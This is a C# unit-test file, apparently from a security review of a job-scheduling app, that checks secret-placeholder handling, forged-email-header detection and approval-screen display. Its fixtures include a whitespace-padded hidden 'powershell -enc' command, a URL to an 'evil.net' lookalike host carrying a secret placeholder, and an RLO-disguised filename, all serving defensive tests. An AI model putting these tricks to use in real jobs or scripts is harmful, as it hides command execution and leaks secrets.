using MimeKit;
using ScheduleApp.Models;
using ScheduleApp.Services;
using ScheduleApp.Services.Engine;
using static ScheduleApp.Tests.TestSupport;

namespace ScheduleApp.Tests;

/// <summary>
/// Kiểm tra bảo mật lần 2 (2026-10-08): biến của trình kích hoạt không đọc được bí mật, header Exchange giả không qua mặt
/// "chỉ nhận email đã xác thực", màn hình duyệt hiện đủ bước tạo giá trị / dùng bí mật / D365 và không cắt chữ, ký tự vô hình hiện ra.
/// </summary>
public class SecurityReviewTests
{
    // ───────────────────────────── Biến của trình kích hoạt ─────────────────────────────

    private sealed class LogLines : IDisposable
    {
        private readonly List<string> _lines = [];
        public LogLines() => Log.Written += Add;
        public List<string> Lines { get { lock (_lines) return [.. _lines]; } }
        private void Add(string line) { lock (_lines) _lines.Add(line); }
        public void Dispose() => Log.Written -= Add;
    }

    [Fact]
    public async Task TriggerVariablesKeepSecretPlaceholdersAsPlainText()
    {
        const string secret = "MatKhau-Kich-Hoat-9z";
        SecretStore.Set("SrMatKhau", secret);
        try
        {
            // Bí mật bị thay nhầm thì nhật ký che thành ***; giữ nguyên chữ thì nhật ký ghi đúng "{{secret:SrMatKhau}}".
            var job = new Job { Name = "Email đến", Steps = [S(StepType.LogMessage, s => s.Text = "SR1 {{email.subject}} | {{trigger.base}}")] };
            // Người gửi email đặt tiêu đề "{{secret:…}}", người tạo file đặt tên "=hoten()" — flow nhận đúng chữ đó.
            var external = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                ["email.subject"] = "{{secret:SrMatKhau}}",
                ["trigger.base"] = "=hoten()"
            };
            using var log = new LogLines();
            var runner = new FlowRunner(new FakeUi(), _ => null);
            var r = await runner.EnqueueAsync(job, "thử", new RunOptions { ExternalVariables = external });
            Assert.True(r!.Ok, r.Message);
            Assert.Contains(log.Lines, l => l.Contains("SR1 {{secret:SrMatKhau}} | =hoten()"));

            // Biến của môi trường kiểm thử (tin cậy) vẫn được thay bí mật; biến kích hoạt cùng tên ghi đè và giữ nguyên chữ.
            var both = new Job { Name = "Cả hai", Steps = [S(StepType.LogMessage, s => s.Text = "SR2 {{mk}} | {{x}}")] };
            r = await runner.EnqueueAsync(both, "thử", new RunOptions
            {
                Variables = new() { ["mk"] = "{{secret:SrMatKhau}}", ["x"] = "{{secret:SrMatKhau}}" },
                ExternalVariables = new() { ["x"] = "{{secret:SrMatKhau}}" }
            });
            Assert.True(r!.Ok, r.Message);
            Assert.Contains(log.Lines, l => l.Contains("SR2 *** | {{secret:SrMatKhau}}"));
            Assert.DoesNotContain(log.Lines, l => l.Contains(secret));
        }
        finally
        {
            SecretStore.Remove("SrMatKhau");
        }
    }

    // ───────────────────────────── Xác thực email ─────────────────────────────

    private static HeaderList Headers(string? authResults, string? authAs)
    {
        var m = new MimeMessage();
        if (authResults != null) m.Headers.Add(HeaderId.AuthenticationResults, authResults);
        if (authAs != null) m.Headers.Add("X-MS-Exchange-Organization-AuthAs", authAs);
        return m.Headers;
    }

    [Fact]
    public void ForgedExchangeAuthAsHeaderIsIgnoredOutsideExchange()
    {
        // Gmail: tên miền người gửi không có DMARC, SPF fail; kẻ gửi tự chèn "AuthAs: Internal".
        var forged = Headers("mx.google.com; spf=fail smtp.mailfrom=ketoan@doitac.vn", "Internal");
        Assert.Equal(MailAuth.Fail, MailWatcher.EvaluateAuthentication(forged, "ketoan@doitac.vn", exchangeMailbox: false).Result);
        var noResults = Headers(null, "Internal");
        Assert.Equal(MailAuth.Unknown, MailWatcher.EvaluateAuthentication(noResults, "ketoan@doitac.vn", exchangeMailbox: false).Result);

        // Hộp thư Exchange Online: Exchange xóa header này ở thư từ ngoài → còn header là thư nội bộ thật.
        Assert.Equal(MailAuth.Pass, MailWatcher.EvaluateAuthentication(noResults, "ketoan@congty.vn", exchangeMailbox: true).Result);
    }

    [Theory]
    [InlineData("outlook.office365.com", true)]
    [InlineData("OUTLOOK.OFFICE365.COM.", true)]
    [InlineData("imap-mail.outlook.com", true)]
    [InlineData("outlook.office.com", true)]
    [InlineData("imap.gmail.com", false)]
    [InlineData("mail.congty.vn", false)]
    [InlineData("outlook.com.evil.net", false)]
    [InlineData("evil-outlook.com", false)]
    [InlineData("", false)]
    public void ExchangeOnlineHostIsRecognised(string host, bool expected) =>
        Assert.Equal(expected, MailWatcher.IsExchangeOnlineHost(host));

    // ───────────────────────────── Màn hình duyệt ─────────────────────────────

    private static readonly string LongValue = "echo ok" + new string(' ', 80) + "& powershell -enc SQBFAFgA";

    private static Job Imported()
    {
        var job = new Job
        {
            Name = "Nhập về",
            Schedule = new ScheduleConfig { Type = ScheduleType.Manual },
            CleanupTestData = true,
            Steps =
            [
                S(StepType.SetVariable, s => { s.Variable = "c"; s.VarSource = VarSource.Value; s.Text = LongValue; }),
                S(StepType.RunCommand, s => s.Target = "{{c}}"),
                S(StepType.If, s => { s.Condition = ConditionKind.D365RecordCount; s.Text = "https://org.crm.dynamics.com.evil.net/q?p={{secret:D365Pass}}"; s.CompareOp = CompareOp.Greater; s.Arguments = "0"; }),
                S(StepType.EndIf),
                S(StepType.Assert, s => { s.Condition = ConditionKind.Compare; s.Message = "Kiểm tra trang chủ"; s.Target = "{{secret:Khoa}}"; s.CompareOp = CompareOp.IsNotEmpty; }),
                S(StepType.LogMessage, s => s.Text = "xong")
            ]
        };
        JobApproval.Require(job, "nhập từ file thử");
        return job;
    }

    [Fact]
    public void ImportSummaryShowsValueStepsSecretsAndD365QueriesInFull()
    {
        var summary = JobApproval.ImportSummary([Imported()]);
        Assert.Contains("■ Nhập về — 6 bước, 4 bước cần xem kỹ", summary);
        Assert.Contains("⚠ 1. {{c}} ← \"" + LongValue + "\"", summary);                // giá trị gán biến không bị cắt
        Assert.Contains("⚠ 2. Chạy lệnh: {{c}}", summary);
        Assert.Contains("⚠ 3. Nếu số bản ghi của https://org.crm.dynamics.com.evil.net/q?p={{secret:D365Pass}}", summary);
        Assert.Contains("⚠ 5. Kiểm tra: Kiểm tra trang chủ (", summary);                 // nhãn tự đặt không che điều kiện
        Assert.Contains("XÓA các bản ghi Dynamics 365", summary);
        Assert.DoesNotContain("6. Ghi: xong", summary);
    }

    [Fact]
    public void ApprovalSummaryMarksReviewStepsAndDoesNotTruncate()
    {
        var summary = JobApproval.Summary(Imported());
        Assert.Contains("4 bước cần xem kỹ", summary);
        Assert.Contains("⚠ 1. {{c}} ← \"" + LongValue + "\"", summary);
        Assert.Contains("   6. Ghi: xong", summary);
        Assert.DoesNotContain("…", summary);
    }

    [Fact]
    public void InvisibleFormattingCharactersAreShownInApproval()
    {
        // U+202E đảo chiều chữ: "exe.txt" hiện ra như "txt.exe"; U+200B khoảng trắng độ rộng 0.
        const char Rlo = (char)0x202E, Zwsp = (char)0x200B;
        var job = new Job { Name = "Lừa mắt", Schedule = new ScheduleConfig { Type = ScheduleType.Manual }, Steps = [S(StepType.RunCommand, s => s.Target = $"start hoa{Rlo}exe.txt{Zwsp}")] };
        var summary = JobApproval.Summary(job);
        Assert.Contains("start hoa⟦U+202E⟧exe.txt⟦U+200B⟧", summary);
        Assert.False(summary.Contains(Rlo));
    }

    [Fact]
    public void NeedsReviewCoversValueSourcesSecretsAndD365()
    {
        Assert.True(S(StepType.SetVariable, s => { s.VarSource = VarSource.Value; s.Text = "x"; }).NeedsReview);
        Assert.True(S(StepType.Loop, s => { s.LoopKind = LoopKind.Lines; s.Target = "{{email.body}}"; }).NeedsReview);
        Assert.True(S(StepType.Dynamics, s => s.D365Action = D365Action.Cleanup).NeedsReview);
        Assert.True(S(StepType.Dynamics, s => { s.D365Action = D365Action.SetField; s.Text = "description"; s.Arguments = "{{secret:X}}"; }).NeedsReview);
        Assert.True(S(StepType.CallJob).NeedsReview);
        Assert.False(S(StepType.Dynamics, s => { s.D365Action = D365Action.SetField; s.Text = "name"; s.Arguments = "ABC"; }).NeedsReview);
        Assert.False(S(StepType.LogMessage, s => s.Text = "a").NeedsReview);
        Assert.False(S(StepType.Loop, s => { s.LoopKind = LoopKind.Count; s.Count = 3; }).NeedsReview);
    }
}
